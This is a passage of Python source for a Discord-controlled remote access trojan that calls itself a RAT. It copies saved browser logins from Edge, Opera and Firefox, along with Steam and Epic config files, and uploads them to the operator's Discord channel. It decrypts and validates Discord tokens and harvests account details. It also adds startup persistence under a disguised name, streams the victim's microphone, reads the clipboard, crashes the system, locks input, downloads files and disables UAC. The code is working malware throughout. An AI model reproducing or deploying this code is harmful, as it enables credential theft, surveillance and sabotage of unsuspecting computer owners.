            result = "Edge Credentials (encrypted, requires decryption)\n\n"
            result += f"Login Data file copied from: {edge_path}\n"
            result += "Note: This file contains encrypted credentials that need to be decrypted"
            
            await send_creds_file(result, "edge_credentials.txt")
            
            await ctx.send("**Edge Login Data file:**", file=discord.File(temp_path))
            os.remove(temp_path)
        
        elif service == "opera" or service == "operagx":
            opera_path = os.path.join(os.environ['APPDATA'], 
                        'Opera Software\\Opera Stable\\Login Data')
            opera_gx_path = os.path.join(os.environ['APPDATA'], 
                           'Opera Software\\Opera GX Stable\\Login Data')
            
            path_to_use = opera_path if os.path.exists(opera_path) else opera_gx_path
            
            if not os.path.exists(path_to_use):
                await ctx.send("Opera/Opera GX Login Data not found.")
                return
            
            temp_path = os.path.join(os.environ['TEMP'], 'opera_login_data')
            shutil.copy2(path_to_use, temp_path)
            
            result = "Opera/Opera GX Credentials (encrypted, requires decryption)\n\n"
            result += f"Login Data file copied from: {path_to_use}\n"
            result += "Note: This file contains encrypted credentials that need to be decrypted"
            
            await send_creds_file(result, "opera_credentials.txt")
            
            await ctx.send("**Opera Login Data file:**", file=discord.File(temp_path))
            os.remove(temp_path)
        
        elif service == "firefox":
            firefox_path = os.path.join(os.environ['APPDATA'], 
                         'Mozilla\\Firefox\\Profiles')
            
            if not os.path.exists(firefox_path):
                await ctx.send("Firefox profiles not found.")
                return
            
            profiles = [d for d in os.listdir(firefox_path) if os.path.isdir(os.path.join(firefox_path, d))]
            
            if not profiles:
                await ctx.send("No Firefox profiles found.")
                return
            
            result = "Firefox Profiles Information:\n\n"
            
            for profile in profiles:
                profile_path = os.path.join(firefox_path, profile)
                result += f"Profile: {profile}\n"
                result += f"Path: {profile_path}\n"
                
                logins_path = os.path.join(profile_path, 'logins.json')
                key4_path = os.path.join(profile_path, 'key4.db')
                
                if os.path.exists(logins_path):
                    result += "- logins.json found (contains encrypted logins)\n"
                    temp_logins = os.path.join(os.environ['TEMP'], f'firefox_{profile}_logins.json')
                    shutil.copy2(logins_path, temp_logins)
                    await ctx.send(f"**Firefox {profile} logins.json:**", file=discord.File(temp_logins))
                    os.remove(temp_logins)
                
                if os.path.exists(key4_path):
                    result += "- key4.db found (contains encryption keys)\n"
                    temp_key4 = os.path.join(os.environ['TEMP'], f'firefox_{profile}_key4.db')
                    shutil.copy2(key4_path, temp_key4)
                    await ctx.send(f"**Firefox {profile} key4.db:**", file=discord.File(temp_key4))
                    os.remove(temp_key4)
                
                result += "\n"
            
            await send_creds_file(result, "firefox_credentials.txt")
        
        elif service == "steam":
            steam_path = None
            
            potential_paths = [
                "C:\\Program Files (x86)\\Steam",
                "C:\\Program Files\\Steam",
                "D:\\Steam",
                "E:\\Steam"
            ]
            
            for path in potential_paths:
                if os.path.exists(path):
                    steam_path = path
                    break
            
            if not steam_path:
                await ctx.send("Steam installation not found.")
                return
            
            config_path = os.path.join(steam_path, 'config')
            
            if not os.path.exists(config_path):
                await ctx.send("Steam config folder not found.")
                return
            
            result = "Steam Configuration Files:\n\n"
            
            config_files = ['config.vdf', 'loginusers.vdf']
            found_files = []
            
            for file in config_files:
                file_path = os.path.join(config_path, file)
                if os.path.exists(file_path):
                    result += f"Found {file} at {file_path}\n"
                    found_files.append((file, file_path))
            
            if not found_files:
                await ctx.send("No relevant Steam config files found.")
                return
            
            await send_creds_file(result, "steam_info.txt")
            
            for file_name, file_path in found_files:
                temp_path = os.path.join(os.environ['TEMP'], file_name)
                shutil.copy2(file_path, temp_path)
                await ctx.send(f"**Steam {file_name}:**", file=discord.File(temp_path))
                os.remove(temp_path)
        
        elif service == "epic":
            epic_path = os.path.join(os.environ['LOCALAPPDATA'], 
                      'EpicGamesLauncher\\Saved\\Config\\Windows')
            
            if not os.path.exists(epic_path):
                await ctx.send("Epic Games configuration not found.")
                return
            
            result = "Epic Games Configuration Files:\n\n"
            
            config_files = [f for f in os.listdir(epic_path) if f.endswith('.ini')]
            
            if not config_files:
                await ctx.send("No Epic Games config files found.")
                return
            
            for file in config_files:
                file_path = os.path.join(epic_path, file)
                result += f"Found {file} at {file_path}\n"
                
                temp_path = os.path.join(os.environ['TEMP'], file)
                shutil.copy2(file_path, temp_path)
                await ctx.send(f"**Epic Games {file}:**", file=discord.File(temp_path))
                os.remove(temp_path)
            
            await send_creds_file(result, "epic_games_info.txt")
        
        elif service == "discord":
            from Crypto.Cipher import AES
            from win32crypt import CryptUnprotectData
            from datetime import datetime
            import os, json, base64, re, requests

            # Token patterns https://stackoverflow.com/questions/76498176/discord-tokens-regex
            TOKEN_REGEX = [
                r"(mfa\.[\w-]{84})",
                r"([\w-]{24,26}\.[\w-]{6}\.[\w-]{27,38})"
            ]
            ENCRYPTED_REGEX = r"dQw4w9WgXcQ:[^\"]*"

            def get_token_info(token): # https://github.com/wodxgod/DTI
                try:
                    headers = {'Authorization': token, 'Content-Type': 'application/json'}
                    user = requests.get('https://discord.com/api/v9/users/@me', headers=headers).json()
                    
                    info = f"=== Discord Account Information ===\n"
                    info += f"Username: {user['username']}\n"
                    info += f"User ID: {user['id']}\n"
                    info += f"Email: {user.get('email', 'None')}\n"
                    info += f"Phone: {user.get('phone', 'None')}\n"
                    info += f"2FA Enabled: {user.get('mfa_enabled', False)}\n"
                    creation_date = datetime.fromtimestamp(((int(user['id']) >> 22) + 1420070400000) / 1000, tz=timezone.utc)
                    info += f"Account Created: {creation_date}\n"
                    subs = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers).json()
                    info += f"Nitro Status: {'Active' if subs else 'Inactive'}\n"
                    # more info about saved billing info maybe?
                    return info
                except:
                    return None

            def hunt_tokens():
                found_tokens = []
                search_paths = [
                    os.getenv("APPDATA") + "\\Discord",
                    os.getenv("APPDATA") + "\\discordcanary",
                    os.getenv("APPDATA") + "\\discordptb",
                    os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default",
                    os.getenv("APPDATA") + "\\Opera Software\\Opera Stable",
                    os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default"
                ]

                for root in search_paths:
                    if not os.path.exists(root):
                        continue

                    leveldb = os.path.join(root, "Local Storage\\leveldb")
                    if not os.path.exists(leveldb):
                        continue

                    for file in os.listdir(leveldb):
                        if not file.endswith(('.log', '.ldb')):
                            continue

                        try:
                            with open(os.path.join(leveldb, file), 'r', errors='ignore') as f:
                                for line in f:
                                    for encrypted in re.findall(ENCRYPTED_REGEX, line):
                                        key = get_master_key(root + "\\Local State")
                                        decrypted = decrypt_token(
                                            base64.b64decode(encrypted.split('dQw4w9WgXcQ:')[1]),
                                            key
                                        )
                                        if decrypted and decrypted not in found_tokens:
                                            found_tokens.append(decrypted)

                                    for pattern in TOKEN_REGEX:
                                        for token in re.findall(pattern, line):
                                            if token not in found_tokens:
                                                found_tokens.append(token)
                        except:
                            continue

                return found_tokens

            def decrypt_token(encrypted: bytes, key: bytes) -> str:
                try:
                    iv = encrypted[3:15]
                    payload = encrypted[15:]
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    return cipher.decrypt(payload)[:-16].decode()
                except:
                    return None

            def get_master_key(path: str) -> bytes:
                with open(path, "r", encoding="utf-8") as f:
                    local_state = json.load(f)
                return CryptUnprotectData(
                    base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:],
                    None, None, None, 0
                )[1]

            tokens = hunt_tokens()
            valid_tokens = []
            info_files = []

            for token in tokens:
                try:
                    if requests.get("https://discord.com/api/v9/users/@me", 
                                  headers={'Authorization': token}).status_code == 200:
                        valid_tokens.append(token)
                        
                        info = get_token_info(token)
                        if info:
                            info_path = os.path.join(os.environ['TEMP'], f'discord_info_{len(valid_tokens)}.txt')
                            with open(info_path, 'w') as f:
                                f.write(info)
                            info_files.append(info_path)
                except:
                    continue

            if valid_tokens:
                await ctx.send(f"**Found {len(valid_tokens)} valid tokens:**")
                await ctx.send("\n".join(valid_tokens))
                
                for info_file in info_files:
                    await ctx.send(file=discord.File(info_file))
                    os.remove(info_file)
            else:
                await ctx.send("No valid tokens found.")

        else:
            await ctx.send(f"Service '{service}' not supported. Use `!steal` to see available services.")
            
    except Exception as e:
        await ctx.send(f"Token extraction failed: {str(e)}")
    
    except Exception as e:
        await ctx.send(f"Error stealing credentials: {str(e)}")

# Restart command
@bot.command()
async def restart(ctx):
    if ctx.channel != ctrl_channel:
        return
    
    try:
        await ctx.send("Restarting computer in 5 seconds...")
        subprocess.run('shutdown /r /t 5', shell=True)
    except Exception as e:
        await ctx.send(f"Error restarting computer: {str(e)}")
def bsod():
    ntdll = windll.ntdll
    RtlAdjustPrivilege = ntdll.RtlAdjustPrivilege
    NtRaiseHardError = ntdll.NtRaiseHardError
    privilege = c_uint(19)
    enabled = c_bool(True)
    current_thread = c_bool(False)
    result = c_bool(False)
    RtlAdjustPrivilege(privilege, enabled, current_thread, byref(result))
    
    response = c_uint(0)
    NtRaiseHardError(0xC0000022, 0, 0, 0, 6, byref(response))

# Troll commands
@bot.command()
async def troll(ctx, troll_type=None, *, content=None):
    if ctx.channel != ctrl_channel:
        return
    
    if not troll_type:
        await ctx.send(f"""
**Troll Commands:**
- `{command_pref}troll tts <message>` - Use text-to-speech to say a message
- `{command_pref}troll bluescreen` - Trigger a BSOD
- `{command_pref}troll wallpaper <url>` - Change desktop wallpaper
- `{command_pref}troll lock mouse` - Lock mouse input
- `{command_pref}troll unlock mouse` - Unlock mouse input
- `{command_pref}troll lock keyboard` - Lock keyboard input
- `{command_pref}troll unlock keyboard` - Unlock keyboard input
- `{command_pref}troll azerty` - Change keyboard layout to AZERTY
- `{command_pref}troll qwerty` - Change keyboard layout to QWERTY
- `{command_pref}troll revertall` - Revert all changes to default settings
""")
        return
        
    if troll_type.lower() == "tts":
        if not content:
            await ctx.send("Please provide a message for text-to-speech.")
            return
            
        try:
            ps_command = f'''powershell -Command "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(\'{content}\')"'''
            subprocess.Popen(ps_command, shell=True)
            await ctx.send(f"TTS message sent: '{content}'")
        except Exception as e:
            await ctx.send(f"Error sending TTS message: {str(e)}")
            
    if troll_type.lower() == "bluescreen":
        try:
            await ctx.send("Triggering BSOD.")
            bsod()
        except Exception as e:
            await ctx.send(f"Failed to trigger BSOD: {str(e)}")
            
    if troll_type.lower() == "wallpaper":
        if not content:
            await ctx.send("Please provide a direct URL to the wallpaper.")
            return

        valid_extensions = ('.jpg', '.jpeg', '.png')
        if not any(content.lower().endswith(ext) for ext in valid_extensions):
            await ctx.send("Only .jpg, .jpeg, and .png files are supported.")
            return

        try:
            temp_dir = os.getenv('TEMP')
            path = os.path.join(temp_dir, "temp.jpg")

            response = requests.get(content)
            response.raise_for_status()

            with open(path, 'wb') as f:
                f.write(response.content)

            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
            await ctx.send("Wallpaper changed successfully.")

        except Exception as e:
            await ctx.send(f"Failed to change wallpaper: {str(e)}")

        except Exception as e:
            await ctx.send(f"Error changing wallpaper: {str(e)}")
            
    elif troll_type.lower() == "lock" and content and content.lower() == "mouse":
        try:
            block_path = os.path.join(os.environ['TEMP'], 'block_mouse.ps1')
            with open(block_path, 'w') as f:
                f.write("""
# Create flag file
Set-Content -Path "$env:TEMP\\mouse_blocked" -Value "1"

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class MouseLocker {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
}
"@

[MouseLocker]::BlockInput($true)

while (Test-Path "$env:TEMP\\mouse_blocked") {
    Start-Sleep -Milliseconds 500
}

[MouseLocker]::BlockInput($false)
""")
            
            subprocess.Popen(["powershell", "-ExecutionPolicy", "Bypass", "-File", block_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)

            await ctx.send("Mouse input blocked. Use `!troll unlock mouse` to unblock.")
        except Exception as e:
            await ctx.send(f"Error blocking mouse input: {str(e)}")
    
    elif troll_type.lower() == "unlock" and content and content.lower() == "mouse":
        try:
            block_flag = os.path.join(os.environ['TEMP'], 'mouse_blocked')
            if os.path.exists(block_flag):
                os.remove(block_flag)
                await ctx.send("Mouse input unblocked.")
            else:
                await ctx.send("Mouse was not blocked.")
        except Exception as e:
            await ctx.send(f"Error unblocking mouse input: {str(e)}")
    
    elif troll_type.lower() == "lock" and content and content.lower() == "keyboard":
        try:        
            kb_block_path = os.path.join(os.environ['TEMP'], 'block_keyboard.ps1')
            with open(kb_block_path, 'w') as f:
                f.write("""
Set-Content -Path "$env:TEMP\\keyboard_blocked" -Value "1"

Add-Type @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

public class KeyboardBlocker {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_KEYUP = 0x0101;
    private const int WM_SYSKEYDOWN = 0x0104;
    private const int WM_SYSKEYUP = 0x0105;
    private const int VK_ESCAPE = 0x1B;
    
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    
    private static IntPtr hookId = IntPtr.Zero;
    private static LowLevelKeyboardProc proc = HookCallback;
    
    public static void BlockKeyboard() {
        hookId = SetHook(proc);
    }
    
    public static void UnblockKeyboard() {
        UnhookWindowsHookEx(hookId);
    }
    
    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }
    
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) {
            if (File.Exists(Environment.GetEnvironmentVariable("TEMP") + "\\\\keyboard_blocked")) {
                if (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN) {
                    int vkCode = Marshal.ReadInt32(lParam);
                }
                return (IntPtr)1;
            }
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
}
"@

[KeyboardBlocker]::BlockKeyboard()

while (Test-Path "$env:TEMP\\keyboard_blocked") {
    Start-Sleep -Milliseconds 500
}

[KeyboardBlocker]::UnblockKeyboard()
""")
            
            subprocess.Popen(["powershell", "-ExecutionPolicy", "Bypass", "-File", kb_block_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
            

            await ctx.send("Keyboard input blocked. Use `!troll unlock keyboard` to unblock.")
        except Exception as e:
            await ctx.send(f"Error blocking keyboard input: {str(e)}")
    
    elif troll_type.lower() == "unlock" and content and content.lower() == "keyboard":
        try:
            kb_block_flag = os.path.join(os.environ['TEMP'], 'keyboard_blocked')
            if os.path.exists(kb_block_flag):
                os.remove(kb_block_flag)
                await ctx.send("Keyboard input unblocked.")
            else:
                await ctx.send("Keyboard was not blocked.")
        except Exception as e:
            await ctx.send(f"Error unblocking keyboard input: {str(e)}")
    
    elif troll_type.lower() == "azerty":
        try:
            ps_command = '''powershell -Command "Set-WinUILanguageOverride -Language nl-BE; Set-WinUserLanguageList -LanguageList nl-BE -Force; Set-WinSystemLocale nl-BE; Set-Culture nl-BE"'''
            subprocess.Popen(ps_command, shell=True)
            await ctx.send("Keyboard layout changed to AZERTY (Belgium).")
        except Exception as e:
            await ctx.send(f"Error changing keyboard layout: {str(e)}")

    elif troll_type.lower() == "qwerty":
        try:
            ps_command = '''powershell -Command "Set-WinUILanguageOverride -Language en-US; Set-WinUserLanguageList -LanguageList en-US -Force; Set-WinSystemLocale en-US; Set-Culture en-US"'''
            subprocess.Popen(ps_command, shell=True)
            await ctx.send("Keyboard layout changed to QWERTY (US).")
        except Exception as e:
            await ctx.send(f"Error changing keyboard layout: {str(e)}")
    
    elif troll_type.lower() == "revertall":
        try:
            mouse_block_flag = os.path.join(os.environ['TEMP'], 'mouse_blocked')
            if os.path.exists(mouse_block_flag):
                os.remove(mouse_block_flag)
            
            kb_block_flag = os.path.join(os.environ['TEMP'], 'keyboard_blocked')
            if os.path.exists(kb_block_flag):
                os.remove(kb_block_flag)
            
            ps_command = '''powershell -Command "$langs = Get-WinUserLanguageList; $langs.Clear(); $en = New-WinUserLanguageList -Language \'en-US\'; $langs.Add($en); Set-WinUserLanguageList $langs -Force"'''
            subprocess.Popen(ps_command, shell=True)
            
            ps_command = '''powershell -Command "$setwallpapersrc = @\''\nusing System.Runtime.InteropServices;\npublic class Wallpaper {\npublic const int SetDesktopWallpaper = 20;\npublic const int UpdateIniFile = 0x01;\npublic const int SendWinIniChange = 0x02;\n[DllImport(\\"user32.dll\\", SetLastError = true, CharSet = CharSet.Auto)]\npublic static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);\n}\n\'@\nadd-type $setwallpapersrc\n[Wallpaper]::SystemParametersInfo([Wallpaper]::SetDesktopWallpaper, 0, \'\', [Wallpaper]::UpdateIniFile -bor [Wallpaper]::SendWinIniChange)"'''
            subprocess.Popen(ps_command, shell=True)
            
            await ctx.send("All changes have been reverted to default settings.")
        except Exception as e:
            await ctx.send(f"Error reverting changes: {str(e)}")
    
    else:
        await ctx.send(f"Invalid troll command. Use `{command_pref}troll` to see available commands.")

# Startup command
@bot.command()
async def startup(ctx, action=None):
    if ctx.channel != ctrl_channel:
        return
    
    if not action:
        await ctx.send("Please specify 'add' or 'remove'.")
        return
    
    try:
        exe_path = sys.executable
        if sys.argv[0].endswith('.py'):
            exe_path = os.path.join(os.environ['TEMP'], 'startup_script.bat')
            with open(exe_path, 'w') as f:
                f.write(f'@echo off\n"{sys.executable}" "{os.path.abspath(sys.argv[0])}"')
        
        startup_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
                                    0, winreg.KEY_SET_VALUE)
        
        if action.lower() == "add":
            winreg.SetValueEx(startup_key, "SystemManager", 0, winreg.REG_SZ, f'"{exe_path}"')
            await ctx.send("Added to startup successfully.")
        
        elif action.lower() == "remove":
            try:
                winreg.DeleteValue(startup_key, "SystemManager")
                await ctx.send("Removed from startup successfully.")
            except FileNotFoundError:
                await ctx.send("Program is not in startup.")
        
        else:
            await ctx.send("Invalid action. Use 'add' or 'remove'.")
        
        winreg.CloseKey(startup_key)
    
    except Exception as e:
        await ctx.send(f"Error modifying startup: {str(e)}")

# Logoff command
@bot.command()
async def logoff(ctx):
    if ctx.channel != ctrl_channel:
        return
    
    try:
        await ctx.send("Logging off user...")
        subprocess.run('shutdown /l', shell=True)
    except Exception as e:
        await ctx.send(f"Error logging off: {str(e)}")

# Website command
@bot.command()
async def website(ctx, url=None):
    if ctx.channel != ctrl_channel:
        return
    
    if not url:
        await ctx.send("Please provide a URL to open.")
        return
    
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        await ctx.send(f"Opening URL: {url}")
        os.startfile(url)
    except Exception as e:
        await ctx.send(f"Error opening website: {str(e)}")

# System info command, could be more detailed, but i'm lazy
@bot.command()
async def info(ctx, category=None):
    if ctx.channel != ctrl_channel:
        return
    
    categories = ["system", "hardware", "network", "storage"]

    if not category:
        await ctx.send(f"""**Info Commands:**
- `{command_pref}info system` - Display OS and system info
- `{command_pref}info hardware` - Show CPU, RAM, and hardware info
- `{command_pref}info network` - Network and IP info
- `{command_pref}info processes` - Running processes info
- `{command_pref}info storage` - Disk usage and storage info
""")
        return
    
    category = category.lower()
    
    if category == "system":
        os_name = platform.system()
        os_version = platform.version()
        build_number = "Unknown"
        
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion") as key:
                try:
                    os_name = winreg.QueryValueEx(key, "ProductName")[0]
                except FileNotFoundError:
                    pass
                
                try:
                    os_version = winreg.QueryValueEx(key, "DisplayVersion")[0]
                except FileNotFoundError:
                    try:
                        os_version = winreg.QueryValueEx(key, "ReleaseId")[0]
                    except FileNotFoundError:
                        pass
                
                try:
                    build_number = winreg.QueryValueEx(key, "CurrentBuild")[0]
                except FileNotFoundError:
                    pass
                    
        except Exception as e:
            print(f"Registry access failed: {e}")
            
        try:
            computer_name = os.environ.get('COMPUTERNAME', socket.gethostname())
        except:
            computer_name = "Unknown"
            
        try:
            username = getpass.getuser()
        except:
            username = "Unknown"
            
        try:
            domain = os.environ.get('USERDOMAIN', 'WORKGROUP')
        except:
            domain = "Unknown"
            
        try:
            boot_time = datetime.fromtimestamp(psutil.boot_time())
            uptime = datetime.now() - boot_time
            boot_time_str = boot_time.strftime('%Y-%m-%d %H:%M:%S')
            uptime_str = str(uptime).split('.')[0]
        except Exception as e:
            boot_time_str = "Unknown"
            uptime_str = "Unknown"
            print(f"Boot time calculation failed: {e}")

        try:
            python_version = platform.python_version()
        except:
            python_version = "Unknown"
            
        try:
            architecture = platform.architecture()[0]
        except:
            architecture = "Unknown"
        
        info = f"""**System Information:**
- OS Name: ``{os_name}``
- OS Version: ``{os_version}``
- Build Number: ``{build_number}``
- Architecture: ``{architecture}``
- Computer Name: ``{computer_name}``
- Username: ``{username}``
- Domain: ``{domain}``
- Boot Time: ``{boot_time_str}``
- Uptime: ``{uptime_str}``
"""
        
        try:
            await ctx.send(info)
        except Exception as e:
            await ctx.send(f"Error sending system info: {str(e)}")
    
    elif category == "hardware":
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0") as key:
                cpu_name = winreg.QueryValueEx(key, "ProcessorNameString")[0]
        except:
            cpu_name = platform.processor()
        
        memory = psutil.virtual_memory()
        cpu_cores_physical = psutil.cpu_count(logical=False)
        cpu_cores_logical = psutil.cpu_count(logical=True)
        
        gpu_info = "Couldn't find GPU, maybe the computer is running windows 11?"
        try:
            result = subprocess.run(['wmic', 'path', 'win32_VideoController', 'get', 'name'], 
                                  capture_output=True, text=True, shell=True)
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                gpu_names = [line.strip() for line in lines if line.strip() and 'Name' not in line and 'Microsoft' not in line]
                if gpu_names:
                    gpu_info = gpu_names[0]
        except:
            pass
        
        info = f"""**Hardware Information:**
- CPU Name: {cpu_name}
- CPU Cores: {cpu_cores_physical} physical, {cpu_cores_logical} logical
- Total RAM: {memory.total / (1024**3):.2f} GB
- Available RAM: {memory.available / (1024**3):.2f} GB
- RAM Usage: {memory.percent}%
- GPU: {gpu_info}
"""
        await ctx.send(info)
    
    elif category == "network":
        try:
            public_ip = requests.get('https://api.ipify.org', timeout=5).text
        except:
            public_ip = "Unable to retrieve"
        
        hostname = socket.gethostname()
        
        net_info = ""
        try:
            result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True, shell=True)
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                current_adapter = ""
                for line in lines:
                    line = line.strip()
                    if "adapter" in line.lower() and ":" in line:
                        current_adapter = line.split(':')[0].replace('Ethernet adapter', '').replace('Wireless LAN adapter', '').strip()
                        if current_adapter and "Loopback" not in current_adapter:
                            net_info += f"- {current_adapter}:\n"
                    elif "IPv4 Address" in line and current_adapter:
                        ip = line.split(':')[1].strip().replace('(Preferred)', '')
                        net_info += f"  - IPv4: {ip}\n"
                    elif "Default Gateway" in line and current_adapter and ":" in line:
                        gateway = line.split(':')[1].strip()
                        if gateway:
                            net_info += f"  - Gateway: {gateway}\n"
        except:
            net_info = "- Unable to retrieve adapter details\n"
        
        info = f"""**Network Information:**
- Computer Name: ``{hostname}``
- Public IP: ``{public_ip}``
- Network Adapters:
``{net_info}``"""
        await ctx.send(info)
        
    
    elif category == "storage":
        disk_partitions = psutil.disk_partitions()
        
        disk_info = ""
        for partition in disk_partitions:
            if partition.fstype and 'cdrom' not in partition.opts.lower():
                try:
                    disk_usage = psutil.disk_usage(partition.mountpoint)
                    total_gb = disk_usage.total / (1024**3)
                    free_gb = disk_usage.free / (1024**3)
                    used_gb = disk_usage.used / (1024**3)
                    used_percent = (used_gb / total_gb) * 100
                    
                    disk_info += f"- Drive {partition.device}:\n"
                    disk_info += f"  - File System: {partition.fstype}\n"
                    disk_info += f"  - Total: {total_gb:.2f} GB\n"
                    disk_info += f"  - Used: {used_gb:.2f} GB ({used_percent:.1f}%)\n"
                    disk_info += f"  - Free: {free_gb:.2f} GB\n"
                except PermissionError:
                    disk_info += f"- Drive {partition.device}: Permission denied\n"
        
        info = f"""**Storage Information:**
{disk_info}"""
        await ctx.send(info)
    
    else:
        await ctx.send(f"Invalid category. Available: {', '.join(categories)}")

# Voice channel command
@bot.command()
async def voice(ctx, *, link=None):
    global voice_client, streaming_audio, audio_stream
    
    if ctx.channel != ctrl_channel:
        return
    
    if link and link.lower() == "leave":
        streaming_audio = False
        
        if isinstance(audio_stream, ImprovedMicrophoneAudio):
            audio_stream.cleanup()
            audio_stream = None
        
        if voice_client and voice_client.is_connected():
            await voice_client.disconnect()
            voice_client = None
        
        await ctx.send("Left voice channel.")
        return
    
    if not link:
        await ctx.send("Please provide a voice channel link or 'leave' to disconnect.")
        return
    
    try:
        parts = link.split('/')
        channel_id = int(parts[-1])
        
        voice_channel = None
        for guild in bot.guilds:
            channel = guild.get_channel(channel_id)
            if channel and isinstance(channel, discord.VoiceChannel):
                voice_channel = channel
                break
        
        if not voice_channel:
            await ctx.send("Could not find voice channel from link.")
            return
        
        if voice_client and voice_client.is_connected():
            await voice_client.disconnect()
        
        voice_client = await voice_channel.connect(reconnect=True)
        
        bitrate = min(voice_channel.bitrate, 128000)
        
        await ctx.send(f"Connected to voice channel: **{voice_channel.name}** (Bitrate: {bitrate/1000}kbps)")
        
        streaming_audio = True
        audio_stream = ImprovedMicrophoneAudio(streaming_audio)
        
        voice_client.play(audio_stream)
        
        await ctx.send("Now transmitting microphone audio to the voice channel.")
        
    except Exception as e:
        await ctx.send(f"Error connecting to voice channel: {str(e)}")

# Message box command
@bot.command()
async def message(ctx, *, text=None):
    if ctx.channel != ctrl_channel:
        return
    
    if not text:
        await ctx.send("Please provide text to display.")
        return
    
    try:
        vbs_path = os.path.join(os.environ['TEMP'], 'message.vbs')
        with open(vbs_path, 'w') as f:
            f.write(f'MsgBox "{text}", 0, "System Message"')
        
        subprocess.Popen(['cscript', vbs_path], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        await ctx.send("Message displayed on the computer.")
    except Exception as e:
        await ctx.send(f"Error displaying message: {str(e)}")

# Admin check command
@bot.command()
async def admincheck(ctx):
    if ctx.channel != ctrl_channel:
        return
    
    if admin():
        await ctx.send("Program is running with administrative privileges.")
    else:
        await ctx.send("Program is running without administrative privileges.")

# Upload from link command
@bot.command()
async def uploadlink(ctx, url=None):
    if ctx.channel != ctrl_channel:
        return
    
    if not url:
        await ctx.send("Please provide a URL to download from.")
        return
    
    try:
        filename = url.split('/')[-1]
        
        response = requests.get(url)
        with open(filename, 'wb') as f:
            f.write(response.content)
        
        await ctx.send(f"File downloaded and saved as {filename}")
    except Exception as e:
        await ctx.send(f"Error downloading file: {str(e)}")

# Clipboard command
@bot.command()
async def clipboard(ctx):
    if ctx.channel != ctrl_channel:
        return
    
    try:
        clipboard_content = pyperclip.paste()
        if clipboard_content:
            if len(clipboard_content) > 1900:
                with open("clipboard.txt", "w", encoding="utf-8") as f:
                    f.write(clipboard_content)
                await ctx.send(file=discord.File("clipboard.txt"))
                os.remove("clipboard.txt")
            else:
                await ctx.send(f"Clipboard content: ```{clipboard_content}```")
        else:
            await ctx.send("Clipboard is empty.")
    except Exception as e:
        await ctx.send(f"Error getting clipboard content: {str(e)}")

# Exit command
@bot.command()
async def exit(ctx):
    if ctx.channel != ctrl_channel:
        return
    
    await ctx.send("Exiting RAT...")
    await bot.close()
    sys.exit(0)

# UAC command 
@bot.command() # fixing...
async def uac(ctx):
    if ctx.channel != ctrl_channel:
        return
    
    await ctx.send("In development.")


@bot.command()
async def disableuac(ctx):
    if ctx.channel != ctrl_channel:
        return
    
    if not admin():
        await ctx.send("Cannot disable UAC: Not running with administrator privileges.")
        await ctx.send("Please run the 'uac' command first to obtain admin rights.")
        return
    
    await ctx.send("Disabling UAC prompts completely...")
    
    try:
        subprocess.run(
            'reg.exe add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "EnableLUA" /t REG_DWORD /d 0 /f',
            shell=True,
            check=True
        )
        
        subprocess.run(
            'reg.exe add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f',
            shell=True,
            check=True
        )
        
        subprocess.run(
            'reg.exe add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d 0 /f',
            shell=True,
            check=True
        )
        
        await ctx.send("UAC successfully disabled. Changes will take effect after system restart.")
        await ctx.send("Would you like to restart the system now? (yes/no)")
        
        def check(message):
            return message.author == ctx.author and message.channel == ctx.channel and message.content.lower() in ["yes", "no", "y", "n"]
        
        try:
            response = await bot.wait_for('message', check=check, timeout=25.0)
            
